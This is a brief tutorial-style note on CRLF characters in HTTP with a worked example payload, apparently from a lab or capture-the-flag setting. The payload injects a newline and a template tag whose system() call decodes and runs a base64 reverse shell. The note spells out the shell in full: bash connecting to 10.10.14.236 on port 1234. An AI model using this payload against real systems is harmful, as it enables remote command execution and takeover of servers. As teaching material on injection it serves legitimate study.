____

Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special character sequences used in the HTTP protocol to denote the end of a line or the start of a new one. Web servers and browsers use CRLF to distinguish between HTTP headers and the body of a response. These characters are universally employed in HTTP/1.1 communications across various web server types, such as Apache and Microsoft IIS.

# Example

```
History%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yMzYvMTIzNCAwPiYxCg=+|+base64+-d+|+bash");%25
```

This string contains URL-encoded characters. The key parts to look at are:

- `%0A` is the URL-encoded representation of the newline character (LF).
- `%25` is the URL-encoded representation of the percent sign (%).
- `%3d` is the URL-encoded representation of the equals sign (=).
- `%2b` is the URL-encoded representation of the plus sign (+).

## Decoded payload

```perl
History
<% =system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzYvMTIzNCAwPiYxCg= | base64 -d | bash"); %>
```

## Malicious Command: 

The critical part here is the command within the `system` call:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzYvMTIzNCAwPiYxCg= | base64 -d | bash
```

```bash
bash -i >& /dev/tcp/10.10.14.236/1234 0>&1
```
